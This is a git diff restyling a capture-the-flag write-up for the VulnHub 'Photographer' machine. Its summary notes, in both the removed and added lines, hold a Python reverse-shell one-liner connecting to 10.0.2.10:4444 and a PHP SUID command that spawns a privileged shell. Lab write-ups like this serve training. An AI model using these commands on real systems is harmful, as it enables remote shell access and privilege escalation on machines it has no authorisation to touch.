@@ -1,9 +1,11 @@
 ---
+title: Photographer
 categories: [VulnHub]
-tags: [PrivEsc]
+tags: [CMS, PrivEsc, RFI, SUIDs, SMB]
+image:
+  path: https://www.infosecarticles.com/content/images/2020/09/port80-1.png
+  alt: Photographer Machine 📷
 ---
-# Photographer
-
 
 ## **Description ⤵️**
 
@@ -14,7 +16,7 @@ This machine was developed to prepare for OSCP. It is boot2root, tested on Virtu
 
 
 
-Let’s find the IP Address first >>
+### **Let’s find the IP Address first >>**
 
 ```bash
 IP : 10.0.2.25
@@ -106,18 +108,23 @@ while cheching the SUID file I got this →
 proof.txt → d41d8cd98f00b204e9800998ecf8427e
 ```
 
----
+<hr>
+<br>
 
 # **Summery Notes →**
 
-Koken 0.22.24
+> 💡
+>Koken 0.22.24
+>
+>daisa@photographer.com
+>
+>agi@photographer.com
+>
+> ```bash
+> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+> ```
+> 
+> `.**/**usr**/**bin**/**php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"`
+{: .prompt-tip }
 
-daisa@photographer.com
-
-agi@photographer.com
-
-```bash
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-```
-
-`.**/**usr**/**bin**/**php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"`
+<hr>
